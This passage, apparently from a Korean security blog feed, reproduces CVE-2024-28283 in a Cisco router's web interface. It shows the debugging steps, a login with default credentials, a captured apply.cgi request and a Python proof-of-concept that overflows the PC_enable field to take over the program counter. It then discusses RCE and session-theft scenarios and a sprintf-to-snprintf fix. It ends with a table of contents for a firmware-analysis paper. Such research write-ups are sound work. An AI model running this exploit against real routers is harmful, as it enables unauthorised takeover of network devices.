&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2025.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;gdb-multiarch를 설치해 위 사진에 나온 대로의 instruction을 따랐다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2026.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;pc_change_act에 접근하는 요청을 찾고 싶어서, gdb에서 다음과 같이 중단점을 설정했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2027.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 c로 실행되도록 해 두고, 웹서버에 접근했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2028.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;id, pw는 cisco 초기 id:pw값인 admin:admin 혹은 cisco:cisco를 넣어보면 로그인될 것이다.&lt;/p&gt;

&lt;p&gt;admin:admin이었다.&lt;/p&gt;

&lt;p&gt;익스플로잇 타겟 함수를 다시 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 해당 함수에 날아가는 요청은 무조건 위의 strings 중 하나를 포함할 수밖에 없다.&lt;/p&gt;

&lt;p&gt;따라서, 웹서버를 구성하는 파일들에 대해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt; string이 존재하는지 전수조사를 진행했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2029.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuestNetworkSetting.asp&lt;/code&gt;에 해당 문자열이 존재함을 확인했다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55&lt;/code&gt; 에 접근해서, 아무 내용이나 바꾼 다음 ‘Save Settings’를 클릭해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2030.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위와 같이 기존에 설정해 두었던 bp에 걸림을 확인했다. 즉, 타겟 함수를 정상적으로 참조함을 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-익스플로잇-설계&quot;&gt;1.3. 익스플로잇 설계&lt;/h2&gt;

&lt;p&gt;이제 공격 지점을 알았으니 익스플로잇을 설계할 차례다.&lt;/p&gt;

&lt;p&gt;익스 패킷을 설계하기 위해 정상 요청의 포맷을 확인했다.&lt;/p&gt;

&lt;p&gt;해당 요청이 어떤 포맷으로 날아가는지 알기 위해 tcpdump를 사용했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2031.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과 아래와 같은 패킷 내용을 얻을 수 있었다.(개발자 도구로도 확인 가능하나, 개발자 도구로는 패킷 내용을 예쁘게 얻기 어려워 rawdata를 직접 얻었다)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /apply.cgi;session_id=a5603bc78a2241abfe43afefbb587c55 HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 140
Cache-Control: max-age=0
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

submit_button=GuestNetworkSetting&amp;amp;change_action=&amp;amp;gui_action=Apply&amp;amp;wait_time=19&amp;amp;submit_type=&amp;amp;del_mac=&amp;amp;gn_lan_ipaddr=4&amp;amp;gn_enable=0&amp;amp;PC_enable=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;14-익스플로잇&quot;&gt;1.4. 익스플로잇&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;위와 같이 IDA에서 확인된 정보를 고려했을 때,&lt;/p&gt;

  &lt;p&gt;PoC는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;30byte+RET addr taint(4byte)&lt;/code&gt;까지만 하면 될 것 같다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;앞서 이렇게 분석한 바가 있고, 위와 같이 정상 패킷의 형태도 알고 있으니 이제 익스플로잇을 만들어 보자. 시간이 부족해 기존에 존재하는 익스플로잇을 활용했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ex.py
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter target IP: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter session_id: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure_Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit_button&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GuestNetworkSetting&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gui_action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Apply&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;#dummy
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;#return address
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PC_enable&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 스크립트를 아래와 같이 실행했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2032.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, gdb에서 정상적으로 크래시가 발생한 점을 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2033.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2034.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PC레지스터(next instruction을 가리키는 program counter 레지스터)에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x42424242&lt;/code&gt;, 즉 taint가 잘 들어갔다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-익스플로잇을-통해-가능한-침해-시나리오&quot;&gt;2. 익스플로잇을 통해 가능한 침해 시나리오&lt;/h1&gt;

&lt;p&gt;해당 펌웨어의 스택과 힙은 어떤 권한으로 돌아가는 중인지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2035.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;전부 실행 권한을 가진 채로 돌아간다….&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;임베디드 디바이스 칩셋의 컴퓨팅 능력을 고려했��� 때, 펌웨어는 높은 확률로 ASLR이 걸리지 않은 환경에서 돌아갈 것이다.
    &lt;ul&gt;
      &lt;li&gt;즉 기초적인 시스템 해킹 능력이 있다면 누구나  RCE가 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;또한, 해당 라우터는 접근 권한을 세션 ID로 구분하고 있으나 세션 ID가 아래와 같이 GET의 파라미터로 들어오고 있었으며, http 통신을 사용하여 암호화되지 않은 트래픽을 매개하고 있었다.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;따라서 충분히 MITM 공격을 통한 관리자 세션 탈취가 가능하며, 해당 라우터에서는 L7까지의 기능을 제공하는 관계로 Application 레벨에서 가능한 공격(웹 익스플로잇)을 수행할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;혹은 악성 파일 유포지로도 사용할 수 있을 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;물론 이와 같은 설정을 가진 라우터는 사내의 내부망 정도에서만 사용할 확률이 높으나, 망분리 환경에서도 침해사고는 발생하기 때문에 침해사고 발생시의 위험도를 크게 높이는 취약점으로 판단된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-mitigation-제시&quot;&gt;3. Mitigation 제시&lt;/h1&gt;

&lt;p&gt;일차적으로는 패킹을 해야 하긴 하지만, 임베디드 디바이스의 특성상 컴퓨팅 리소스의 한계로 인해 심볼을 날리는 것 이상의 패킹은 어려울 것으로 보인다.&lt;/p&gt;

&lt;p&gt;즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;로 변경해서 올바른 데이터 크기 관리를 하는 것이 현재로서는 가장 근본적인 해결책이다.&lt;/p&gt;
</description>
        <pubDate>Sun, 26 Jan 2025 22:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283</guid>
      </item>
    
      <item>
        <title>KARONTE: Detecting Insecure Multi-binary Interactions in Embedded Firmware 읽기</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-주안점&quot; id=&quot;markdown-toc-0-주안점&quot;&gt;0. 주안점&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-introduction&quot; id=&quot;markdown-toc-1-introduction&quot;&gt;1. Introduction&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-abstract&quot; id=&quot;markdown-toc-11-abstract&quot;&gt;1.1. Abstract&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-background&quot; id=&quot;markdown-toc-2-background&quot;&gt;2. Background&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#emersion-of-iot-devices&quot; id=&quot;markdown-toc-emersion-of-iot-devices&quot;&gt;Emersion of IoT devices&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#constraint-of-traditional-analysis-techniques&quot; id=&quot;markdown-toc-constraint-of-traditional-analysis-techniques&quot;&gt;Constraint of traditional analysis techniques&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#karonte&quot; id=&quot;markdown-toc-karonte&quot;&gt;KARONTE&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-approach-overview&quot; id=&quot;markdown-toc-3-approach-overview&quot;&gt;3. Approach Overview&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-firmware-pre-processing&quot; id=&quot;markdown-toc-31-firmware-pre-processing&quot;&gt;3.1. Firmware Pre-processing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-border-binaries-discovery&quot; id=&quot;markdown-toc-32-border-binaries-discovery&quot;&gt;3.2. Border Binaries Discovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#33-binary-dependency-graphbdg-recovery&quot; id=&quot;markdown-toc-33-binary-dependency-graphbdg-recovery&quot;&gt;3.3. Binary Dependency Graph(BDG) Recovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#34-multi-binary-data-flow-analysis&quot; id=&quot;markdown-toc-34-multi-binary-data-flow-analysis&quot;&gt;3.4. Multi-binary Data-flow Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#35-insecure-interactions-detection&quot; id=&quot;markdown-toc-35-insecure-interactions-detection&quot;&gt;3.5. Insecure Interactions Detection&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-border-binaries-discovery&quot; id=&quot;markdown-toc-4-border-binaries-discovery&quot;&gt;4. Border Binaries Discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-binary-dependency-graph사실상-cpf가-핵심&quot; id=&quot;markdown-toc-5-binary-dependency-graph사실상-cpf가-핵심&quot;&gt;5. Binary Dependency Graph(사실상 CPF가 핵심)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#51-purpose-and-overview&quot; id=&quot;markdown-toc-51-purpose-and-overview&quot;&gt;5.1. Purpose and Overview&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#52-communication-paradigm-finders&quot; id=&quot;markdown-toc-52-communication-paradigm-finders&quot;&gt;5.2. Communication Paradigm Finders&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#objective&quot; id=&quot;markdown-toc-objective&quot;&gt;Objective&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#key-functionalities&quot; id=&quot;markdown-toc-key-functionalities&quot;&gt;Key Functionalities&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#implementation&quot; id=&quot;markdown-toc-implementation&quot;&gt;Implementation&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#53-building-the-bdg&quot; id=&quot;markdown-toc-53-building-the-bdg&quot;&gt;5.3. Building the BDG&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#6-static-taint-analysis&quot; id=&quot;markdown-toc-6-static-taint-analysis&quot;&gt;6. Static Taint Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#7-multi-binary-data-flow-analysis&quot; id=&quot;markdown-toc-7-multi-binary-data-flow-analysis&quot;&gt;&lt;strong&gt;7. Multi-Binary Data-Flow Analysis&lt;/strong&gt;&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#71-key-insight--concepts&quot; id=&quot;markdown-toc-71-key-insight--concepts&quot;&gt;7.1. Key Insight &amp;amp; Concepts&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#72-bfg-building&quot; id=&quot;markdown-toc-72-bfg-building&quot;&gt;7.2. BFG Building&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#8-insecure-interations-detection&quot; id=&quot;markdown-toc-8-insecure-interations-detection&quot;&gt;8. Insecure Interations Detection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#9-discussion&quot; id=&quot;markdown-toc-9-discussion&quot;&gt;9. Discussion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#10-evaluation&quot; id=&quot;markdown-toc-10-evaluation&quot;&gt;10. Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#12-conclusion&quot; id=&quot;markdown-toc-12-conclusion&quot;&gt;12. Conclusion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#appendix&quot; id=&quot;markdown-toc-appendix&quot;&gt;Appendix&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#a-functions-identification&quot; id=&quot;markdown-toc-a-functions-identification&quot;&gt;A. Functions Identification&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#b-border-binaries-discovery&quot; id=&quot;markdown-toc-b-border-binaries-discovery&quot;&gt;B. Border Binaries Discovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#c-communication-paradigm-finders&quot; id=&quot;markdown-toc-c-communication-paradigm-finders&quot;&gt;C. Communication Paradigm Finders&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#d-binary-dependency-graph-algorithm&quot; id=&quot;markdown-toc-d-binary-dependency-graph-algorithm&quot;&gt;D. Binary Dependency Graph Algorithm&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#e-static-taint-analysis&quot; id=&quot;markdown-toc-e-static-taint-analysis&quot;&gt;E. Static Taint Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#f-multi-binary-data-flow-analysis&quot; id=&quot;markdown-toc-f-multi-binary-data-flow-analysis&quot;&gt;F. Multi-binary Data-flow Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#g-vulnerability-example&quot; id=&quot;markdown-toc-g-vulnerability-example&quot;&gt;G. Vulnerability Example&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

